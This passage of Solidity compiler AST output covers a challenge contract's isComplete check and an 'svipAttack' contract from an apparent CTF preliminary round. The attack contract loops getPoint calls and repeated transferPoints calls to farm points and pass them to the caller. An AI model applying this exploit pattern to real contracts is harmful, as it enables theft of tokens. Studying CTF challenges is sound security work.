																"referencedDeclaration": 9,
																"src": "889:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																	"typeString": "mapping(address => bool)"
																}
															},
															"id": 113,
															"indexExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 111,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 207,
																	"src": "900:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 112,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "900:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "889:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 109,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															210,
															211
														],
														"referencedDeclaration": 210,
														"src": "881:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "881:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "881:31:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 116,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "930:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 108,
												"id": 117,
												"nodeType": "Return",
												"src": "923:11:0"
											}
										]
									},
									"documentation": null,
									"id": 119,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": true,
									"modifiers": [],
									"name": "isComplete",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 105,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "840:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 108,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 107,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 119,
												"src": "864:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 106,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "864:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "863:6:0"
									},
									"scope": 120,
									"src": "821:121:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 121,
							"src": "28:919:0"
						}
					],
					"src": "0:1389:0"
				},
				"id": 0
			},
			"赛题-预赛/第二题/SvipAttack.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第二题/SvipAttack.sol",
					"exportedSymbols": {
						"svipAttack": [
							192
						]
					},
					"id": 193,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 122,
							"literals": [
								"solidity",
								"^",
								"0.4",
								".24"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:1"
						},
						{
							"absolutePath": "赛题-预赛/第二题/SVip.sol",
							"file": "./SVip.sol",
							"id": 123,
							"nodeType": "ImportDirective",
							"scope": 193,
							"sourceUnit": 121,
							"src": "26:20:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 192,
							"linearizedBaseContracts": [
								192
							],
							"name": "svipAttack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 125,
									"name": "sv",
									"nodeType": "VariableDeclaration",
									"scope": 192,
									"src": "74:7:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_SVip_$120",
										"typeString": "contract SVip"
									},
									"typeName": {
										"contractScope": null,
										"id": 124,
										"name": "SVip",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 120,
										"src": "74:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SVip_$120",
											"typeString": "contract SVip"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 136,
										"nodeType": "Block",
										"src": "114:35:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 134,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 130,
														"name": "sv",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 125,
														"src": "125:2:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_SVip_$120",
															"typeString": "contract SVip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 132,
																"name": "_addr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 127,
																"src": "135:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 131,
															"name": "SVip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 120,
															"src": "130:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_SVip_$120_$",
																"typeString": "type(contract SVip)"
															}
														},
														"id": 133,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "130:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_SVip_$120",
															"typeString": "contract SVip"
														}
													},
													"src": "125:16:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_SVip_$120",
														"typeString": "contract SVip"
													}
												},
												"id": 135,
												"nodeType": "ExpressionStatement",
												"src": "125:16:1"
											}
										]
									},
									"documentation": null,
									"id": 137,
									"implemented": true,
									"isConstructor": true,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 128,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 127,
												"name": "_addr",
												"nodeType": "VariableDeclaration",
												"scope": 137,
												"src": "100:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 126,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "100:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "99:15:1"
									},
									"payable": false,
									"returnParameters": {
										"id": 129,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "114:0:1"
									},
									"scope": 192,
									"src": "88:61:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 157,
										"nodeType": "Block",
										"src": "175:81:1",
										"statements": [
											{
												"body": {
													"id": 155,
													"nodeType": "Block",
													"src": "209:40:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"expression": {
																		"argumentTypes": null,
																		"id": 150,
																		"name": "sv",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 125,
																		"src": "224:2:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_SVip_$120",
																			"typeString": "contract SVip"
																		}
																	},
																	"id": 152,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "getPoint",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 52,
																	"src": "224:11:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
																		"typeString": "function () external"
																	}
																},
																"id": 153,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "224:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 154,
															"nodeType": "ExpressionStatement",
															"src": "224:13:1"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 146,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 144,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 141,
														"src": "200:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3939",
														"id": 145,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "202:2:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_99_by_1",
															"typeString": "int_const 99"
														},
														"value": "99"
													},
													"src": "200:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 156,
												"initializationExpression": {
													"assignments": [
														141
													],
													"declarations": [
														{
															"constant": false,
															"id": 141,
															"name": "i",
															"nodeType": "VariableDeclaration",
															"scope": 158,
															"src": "190:6:1",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 140,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "190:4:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 143,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 142,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "198:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "190:9:1"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 148,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "205:3:1",
														"subExpression": {
															"argumentTypes": null,
															"id": 147,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 141,
															"src": "205:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 149,
													"nodeType": "ExpressionStatement",
													"src": "205:3:1"
												},
												"nodeType": "ForStatement",
												"src": "186:63:1"
											}
										]
									},
									"documentation": null,
									"id": 158,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "get",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 138,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "167:2:1"
									},
									"payable": false,
									"returnParameters": {
										"id": 139,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "175:0:1"
									},
									"scope": 192,
									"src": "155:101:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 190,
										"nodeType": "Block",
										"src": "287:147:1",
										"statements": [
											{
												"body": {
													"id": 180,
													"nodeType": "Block",
													"src": "320:62:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 175,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 222,
																				"src": "361:4:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_svipAttack_$192",
																					"typeString": "contract svipAttack"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_svipAttack_$192",
																					"typeString": "contract svipAttack"
																				}
																			],
																			"id": 174,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "353:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 176,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "353:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "3938",
																		"id": 177,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "367:2:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_98_by_1",
																			"typeString": "int_const 98"
																		},
																		"value": "98"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_rational_98_by_1",
																			"typeString": "int_const 98"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 171,
																		"name": "sv",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 125,
																		"src": "335:2:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_SVip_$120",
																			"typeString": "contract SVip"
																		}
																	},
																	"id": 173,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "transferPoints",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 104,
																	"src": "335:17:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,uint256) external"
																	}
																},
																"id": 178,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "335:35:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 179,
															"nodeType": "ExpressionStatement",
															"src": "335:35:1"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 165,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 162,
														"src": "311:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3131",
														"id": 166,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "313:2:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_11_by_1",
															"typeString": "int_const 11"
														},
														"value": "11"
													},
													"src": "311:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 181,
												"initializationExpression": {
													"assignments": [
														162
													],
													"declarations": [
														{
															"constant": false,
															"id": 162,
															"name": "i",
															"nodeType": "VariableDeclaration",
															"scope": 191,
															"src": "302:6:1",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 161,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "302:4:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 164,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 163,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "309:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "302:8:1"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 169,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "316:3:1",
														"subExpression": {
															"argumentTypes": null,
															"id": 168,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 162,
															"src": "316:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 170,
													"nodeType": "ExpressionStatement",
													"src": "316:3:1"
												},
												"nodeType": "ForStatement",
												"src": "298:84:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 185,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 207,
																"src": "410:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 186,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "410:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "31303030",
															"id": 187,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "421:4:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1000_by_1",
																"typeString": "int_const 1000"
															},
															"value": "1000"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_1000_by_1",
																"typeString": "int_const 1000"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 182,
															"name": "sv",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 125,
															"src": "392:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_SVip_$120",
																"typeString": "contract SVip"
															}
														},
														"id": 184,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transferPoints",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 104,
														"src": "392:17:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256) external"
														}
													},
													"id": 188,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "392:34:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 189,
												"nodeType": "ExpressionStatement",
												"src": "392:34:1"
											}
										]
									},
									"documentation": null,
									"id": 191,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 159,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "279:2:1"
									},
									"payable": false,
									"returnParameters": {
										"id": 160,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "287:0:1"
									},
									"scope": 192,
									"src": "262:172:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 193,
							"src": "48:389:1"
						}
					],
					"src": "0:437:1"
				},
				"id": 1
			}
		}
	}
}